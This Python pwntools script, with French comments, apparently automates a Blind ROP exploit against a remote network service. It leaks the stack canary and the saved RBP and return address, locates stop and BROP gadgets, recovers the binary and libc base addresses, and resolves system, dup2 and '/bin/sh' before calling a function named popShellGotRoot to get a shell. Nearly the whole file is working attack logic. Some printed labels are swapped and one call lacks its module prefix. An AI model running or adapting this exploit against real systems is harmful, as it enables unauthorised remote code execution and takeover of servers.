#!/usr/bin/python3

from pwn import *
import sys, argparse

from argsprint import *
from binadr import *
from libcadr import *
from shell import *

DODO = 0.03     # Cette valeur permet d'adapter les slesp si probleme de reception de paquet (a la campagne il doit etre grand x) )

#----------
class BinAdr():

    def __init__(self):
        super().__init__()
        self.STOPGADGET = 0x0
        self.BROPGADGET = 0x0
        self.LEAKADR    = 0x0
        self.BINBASE    = 0x0

class LibcAdr():

    def __init__(self):
        super().__init__()
        self.LIBCBASE   = 0x0
        self.DUP2       = 0x0
        self.SYSTEM     = 0x0
        self.BINSH      = 0x0
        self.BUILDID    = '14cd15d2eb0bc25c89045873cf807f7533e4788d'
        self.NOLIBLEAK  = False

    def _get_NOLIBLEAK(self):
        return(self._NOLIBLEAK)

    def _set_NOLIBLEAK(self, VALUE):
        if VALUE:
            print(CVER + "[+] No Libc leak will be performed" + CEND)
        self._NOLIBLEAK = VALUE
        return(self._NOLIBLEAK)

    NOLIBLEAK=property(_get_NOLIBLEAK, _set_NOLIBLEAK)


class LeakedValues():

    def __init__(self):
        super().__init__()

        ##### A ADAPTER
        self.CANARY = p64(0x633ff5b6fce38600)
        self.RBP        = p64(0x00007ffc44c70320)
        self.RETADR = p64(0x00007f8332301245)
        ###############


class ExploitStructure(BinAdr, LibcAdr, LeakedValues):

    HOST = ""
    PORT = ""

    def __init__(self):
        super().__init__()
        self.BUFFER = b'A'*40
        self.CRASH  = b'CRSHCRSH'

        self.EXPLOIT    = 1
        self.SIMPLELEAK = False
        self.HAND       = False


    def remoteConnect(self):
        r = remote(self.HOST, self.PORT)
        return r

    def beginning(self):
        BEGIN = self.BUFFER + self.CANARY + self.RBP
        return BEGIN


#####

def persoPrint(STRING, ADR, NE):

    if NE == 1:
        print(CVER + "[+] " + STRING + " :  {}".format(hex(u64(ADR))) + CEND, end='')
    else:
        print(CVER + "[+] " + STRING + " :  {}".format(hex(u64(ADR))) + CEND)
    return

#####

def stopGadget(ExploitStructure):
    TMP = ExploitStructure
    TMP.STOPGADGET  = binadr.getStopGadget(TMP)
    persoPrint('STOPGADGET ', TMP.STOPGADGET, 1)
    binadr.testGadget(TMP, 'STOPGADGET')

def bropGadget(ExploitStructure):
    TMP = ExploitStructure
    TMP.BROPGADGET  = binadr.getBropGadget(TMP)
    persoPrint('BROPGADGET ', TMP.BROPGADGET, 1)
    binadr.testGadget(TMP, 'BROPGADGET')

def leakAdr(ExploitStructure):
    TMP = ExploitStructure
    TMP.LEAKADR, TMP.BINBASE = binadr.getLeakFunction(TMP)
    persoPrint('BINBASE    ', TMP.BINBASE, 0)
    persoPrint('LEAKADR    ', TMP.LEAKADR, 1)
    binadr.testGadget(TMP, 'LEAKADR')

def libcBase(ExploitStructure):
    TMP = ExploitStructure
    TMP.LIBCBASE = libcadr.getLibcBase(TMP)
    persoPrint('LIBCBASE   ', TMP.LIBCBASE, 1)
    binadr.testGadget(TMP, 'LEAKADR')


def checkBuildID(BUILDID):
#   TMP = ExploitStructure

    if len(BUILDID) == 40:

        if (re.findall(r"([a-fA-F\d]{40})", BUILDID)):
            print(CVER + "[+] BuildID    :  " + BUILDID + CEND)
            return 1
        #else:
        #   print(CRED + "[!] Error with given BuildID    : " + TMP.BUILDID + CEND)
    else:
        print(CRED + "[!] Error with given BuildID    : " + BUILDID + CEND)
        '''
        vori si je demande quoi faire genre en remettre un, par exemple :
            ANOTHER = input(CJAU + "[?] Use specific BuildID ? (y / n) " + CEND)
            if ANOTHER == 'n':
                return 0
            elif ANOTHER == 'y':
                BUILDID = (input(CJAU + "[:] Put the other BuildID > " + CEND)).strip('\x0A')
            mais dans ce cas faut passer es en parametre
                return 1
        '''
        return 0


def leakLib(ExploitStructure):
    TMP = ExploitStructure
    if (TMP.NOLIBLEAK):
        return
    libcadr.leakStuff(TMP)

def symboles(ExploitStructure):
    TMP = ExploitStructure
    TMP.SYSTEM, TMP.DUP2, TMP.BINSH = libcadr.getSymboles(TMP)
    persoPrint('DUP2       ', TMP.SYSTEM, 0)
    persoPrint('SYSTEM     ', TMP.DUP2, 0)
    persoPrint('BINSH      ', TMP.BINSH, 0)

def popShellGotRoot(ExploitStructure):
    shell.exploit(ExploitStructure)


#####

def main():

    es = ExploitStructure()
    checkParameter(es)


#-----
    if es.EXPLOIT == 1:
        printInfo("Starting simple leak")
        es  = binadr.leakValues(es)
        printDone("All 'Leakable' values have been leaked")

    elif es.EXPLOIT == 2:
        printInfo("Starting standard exploitation")

        if es.HAND:
            printInfo("Using manual values")
            persoPrint('CANARY     ', es.CANARY, 0)
            persoPrint('RBP        ', es.RBP, 0)
            persoPrint('RETADR     ', es.RETADR, 0)
        else:
            es = leakValues(es)

        stopGadget(es)
        bropGadget(es)
        leakAdr(es)

        libcBase(es)

        leakLib(es)
        symboles(es)

        popShellGotRoot(es)

        exit(':D')



if __name__ == '__main__':
    main()
